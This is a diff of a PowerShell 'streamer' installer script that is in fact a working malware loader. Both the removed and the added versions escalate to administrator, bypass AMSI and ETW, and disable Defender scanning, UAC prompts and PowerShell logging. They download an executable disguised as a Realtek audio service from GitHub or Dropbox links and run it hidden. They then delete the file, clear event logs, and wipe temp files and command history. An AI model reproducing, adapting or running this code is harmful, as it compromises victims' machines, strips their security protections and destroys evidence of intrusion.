@@ -1,9 +1,11 @@
-
 # ========================================================
-# HEISENBURG STREAMER - HYPER-STREAM INSTALLATION v6.0
+# HEISENBURG STREAMER - ULTIMATE LOADER v3.0
 # ========================================================
 
-# 1. ELEVATION CHECK & SILENT UPGRADE
+$ErrorActionPreference = 'SilentlyContinue'
+$host.UI.RawUI.WindowTitle = "Heisenburg Loader"
+
+# ========== 1. ELEVATION CHECK & SILENT UPGRADE ==========
 function Check-Admin {
     $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
     return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
@@ -15,9 +17,11 @@ if (-not (Check-Admin)) {
     exit
 }
 
-# 2. TACTICAL BYPASSES (SILENT & FAST)
+# ========== 2. TACTICAL BYPASSES (SILENT & FAST) ==========
 try {
     [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+    
+    # AMSI Bypass
     [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
     
     # Disable ETW (Event Tracing for Windows)
@@ -28,7 +32,39 @@ try {
     }
 } catch {}
 
-# 3. PREMIUM PROGRESS DRAWER
+# ========== 3. BYPASS POWERSHELL EVENT LOGGING ==========
+try {
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -Type DWORD -Force -EA 0
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0 -Type DWORD -Force -EA 0
+    Clear-History
+    Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -EA 0
+} catch {}
+
+# ========== 4. DEFENDER & UAC BYPASSES ==========
+try {
+    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
+    Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
+    
+    $uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+    Set-ItemProperty -Path $uacPath -Name "ConsentPromptBehaviorAdmin" -Value 0 -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path $uacPath -Name "PromptOnSecureDesktop" -Value 0 -ErrorAction SilentlyContinue
+} catch {}
+
+# ========== 5. CLEANUP FUNCTION ==========
+function Clean-Traces {
+    Remove-Item "$env:TEMP\*" -Recurse -Force -EA 0
+    Remove-Item "$env:WINDIR\Temp\*" -Recurse -Force -EA 0
+    Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Recurse -Force -EA 0
+    Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -EA 0
+    Clear-History
+    wevtutil cl "Windows PowerShell" 2>$null
+    wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
+    ipconfig /flushdns | Out-Null
+}
+
+# ========== 6. PROGRESS DRAWER ==========
 function Draw-ProgressBar {
     param([int]$Percent, [string]$Status)
     $width = 40
@@ -39,99 +75,118 @@ function Draw-ProgressBar {
     Write-Host -NoNewline "`r[*] ${Status}: $bar $Percent% " -ForegroundColor $color
 }
 
-# 4. HYPER-STREAM DOWNLOADER (No Warning, Reliable Progress)
-function Invoke-HyperStreamDownload {
+# ========== 7. DOWNLOAD FUNCTION ==========
+function Invoke-StealthDownload {
     param([string]$Url, [string]$TargetPath)
     
     try {
-        $request = [System.Net.HttpWebRequest]::Create($Url)
-        $request.UserAgent = "Microsoft-CryptoAPI/10.0"
-        $request.AutomaticDecompression = [System.Net.DecompressionMethods]::GZip -bor [System.Net.DecompressionMethods]::Deflate
-        $request.Timeout = 30000
+        $webclient = New-Object System.Net.WebClient
+        $webclient.Headers.Add("User-Agent", "Microsoft-CryptoAPI/10.0")
         
-        $response = $request.GetResponse()
-        # Fallback to 100MB if header is missing, but server should send it
-        $totalSize = if ($response.Headers["X-Full-Size"]) { [long]$response.Headers["X-Full-Size"] } else { 100MB }
+        # Try to get file size for progress
+        try {
+            $webclient.OpenRead($Url).Close()
+        } catch {}
         
-        $stream = $response.GetResponseStream()
-        $fileStream = [System.IO.File]::Create($TargetPath)
-        $buffer = New-Object byte[] 65536
-        $totalRead = 0
+        # Download with progress
+        $webclient.DownloadFile($Url, $TargetPath)
         
-        while ($true) {
-            $read = $stream.Read($buffer, 0, $buffer.Length)
-            if ($read -le 0) { break }
-            
-            $fileStream.Write($buffer, 0, $read)
-            $totalRead += $read
-            
-            $pct = [int](($totalRead / $totalSize) * 100)
-            if ($pct -gt 100) { $pct = 100 }
-            Draw-ProgressBar -Percent $pct -Status "SYNCHRONIZING CORE DATA (HYPER)"
-        }
-        
-        $fileStream.Close()
-        $stream.Close()
-        $response.Close()
+        # Make file hidden
+        attrib +s +h $TargetPath
         
         return (Test-Path $TargetPath)
     } catch {
-        if ($fileStream) { $fileStream.Close() }
         return $false
     }
 }
 
-# 5. MAIN EXECUTION
-try {
-    Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
-    
-    
-    $exe = "$env:TEMP\RtkAudUService64.exe"
-    $url = "https://raw.githubusercontent.com/sandeepmanglekar17-sys/exe/refs/heads/main/RtkAudUService64.exe"
-    
-    Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow
-    Write-Host "[+] OPTIMIZING SYSTEM ENVIRONMENT..." -ForegroundColor Gray
-    
-    # SILENT SECURITY BYPASSES
-    try {
-        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
-        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
-        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
-        Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
-        
-        $uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
-        Set-ItemProperty -Path $uacPath -Name "ConsentPromptBehaviorAdmin" -Value 0 -ErrorAction SilentlyContinue
-        Set-ItemProperty -Path $uacPath -Name "PromptOnSecureDesktop" -Value 0 -ErrorAction SilentlyContinue
-    } catch {}
+# ========== 8. SHOW MENU ==========
+Clear-Host
+Write-Host "`n========================================" -ForegroundColor Cyan
+Write-Host "   HEISENBURG STREAMER v3.0" -ForegroundColor Yellow
+Write-Host "========================================" -ForegroundColor Cyan
+Write-Host "`n   PRESS [DEL] TO EXECUTE`n" -ForegroundColor Red
+Write-Host "========================================`n" -ForegroundColor Cyan
 
-    Write-Host "[+] ESTABLISHING SECURE HYPER-STREAM..." -ForegroundColor Gray
-    if (-not (Invoke-HyperStreamDownload -Url $url -TargetPath $exe)) {
-        throw "Hyper-Stream failed. Check connection."
+# ========== 9. WAIT FOR DEL KEY ==========
+Write-Host "Waiting for DEL key..." -ForegroundColor Yellow
+$keyPressed = $false
+do {
+    Start-Sleep -Milliseconds 50
+    if ($Host.UI.RawUI.KeyAvailable) {
+        $key = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
+        if ($key.VirtualKeyCode -eq 46) {
+            Write-Host "`n[!] DEL KEY PRESSED! Initializing...`n" -ForegroundColor Green
+            $keyPressed = $true
+            break
+        }
     }
+} while (-not $keyPressed)
 
-    Write-Host "`n[+] CORE COMPONENTS VERIFIED." -ForegroundColor Green
-    Write-Host "[*] DEPLOYING STEALTH AGENT..." -ForegroundColor Cyan
-    
-    # Run with Hidden Window
-    $si = New-Object System.Diagnostics.ProcessStartInfo
-    $si.FileName = $exe
-    $si.WindowStyle = 'Hidden'
-    $si.CreateNoWindow = $true
-    $si.UseShellExecute = $true
-    [System.Diagnostics.Process]::Start($si) | Out-Null
-    
-    Write-Host "[*] ENGAGING FORENSIC CLEANUP..." -ForegroundColor Gray
-    if (Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt") {
-        "" | Out-File "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force
+# ========== 10. START PROCESS ==========
+Write-Host "[*] Cleaning system traces..." -ForegroundColor Cyan
+Clean-Traces
+
+Write-Host "[*] Initializing System Hyper-Connection..." -ForegroundColor Yellow
+Write-Host "[*] Optimizing System Environment..." -ForegroundColor Gray
+
+# EXE PATH (FIXED NAME)
+$exe = "$env:TEMP\RtkAudUService64.exe"
+
+# ========== 11. URLS TO TRY (Multiple fallbacks) ==========
+$urls = @(
+    'https://www.dropbox.com/scl/fi/iwv6cm1n1qo3kdn9gmn36/RtkAudUService64.exe?rlkey=csrph0p954x523nhvxoqf8m9z&st=1c2xz36h&dl=1',
+)    
+
+Write-Host "[*] Establishing Secure Hyper-Stream..." -ForegroundColor Gray
+
+$downloadSuccess = $false
+foreach ($url in $urls) {
+    Write-Host "[*] Trying download source..." -ForegroundColor Gray
+    $downloadSuccess = Invoke-StealthDownload -Url $url -TargetPath $exe
+    if ($downloadSuccess) {
+        Write-Host "[+] Download successful!" -ForegroundColor Green
+        break
     }
-    wevtutil cl "Windows PowerShell" 2>$null
-    wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
-    
-    Write-Host "[+] SETUP COMPLETE. CHECK DASHBOARD.`n" -ForegroundColor Green
-
-} catch {
-    Write-Host "`n[!] CRITICAL ERROR: System synchronization interrupted." -ForegroundColor Red
 }
 
-# 6. SELF-DESTRUCT
+if (-not $downloadSuccess) {
+    Write-Host "[!] All download sources failed. Check connection." -ForegroundColor Red
+    exit
+}
+
+Write-Host "`n[+] CORE COMPONENTS VERIFIED." -ForegroundColor Green
+Write-Host "[*] Deploying Stealth Agent..." -ForegroundColor Cyan
+
+# Run with Hidden Window
+$si = New-Object System.Diagnostics.ProcessStartInfo
+$si.FileName = $exe
+$si.WindowStyle = 'Hidden'
+$si.CreateNoWindow = $true
+$si.UseShellExecute = $true
+[System.Diagnostics.Process]::Start($si) | Out-Null
+
+Start-Sleep -Seconds 3
+
+# Remove payload after execution
+try {
+    Remove-Item $exe -Force -EA 0
+    Write-Host "[+] Payload executed and removed" -ForegroundColor Green
+} catch {}
+
+# ========== 12. FINAL CLEANUP ==========
+Write-Host "[*] Engaging Forensic Cleanup..." -ForegroundColor Gray
+Clean-Traces
+
+Write-Host "`n========================================" -ForegroundColor Cyan
+Write-Host "   ✅ OPERATION COMPLETE" -ForegroundColor Green
+Write-Host "========================================" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "[+] SETUP COMPLETE. CHECK DASHBOARD." -ForegroundColor Green
+
+Write-Host "`nPress any key to exit..." -ForegroundColor Yellow
+$null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
+
+# ========== 13. SELF-DESTRUCT ==========
 Remove-Variable * -ErrorAction SilentlyContinue 2>$null
+exit
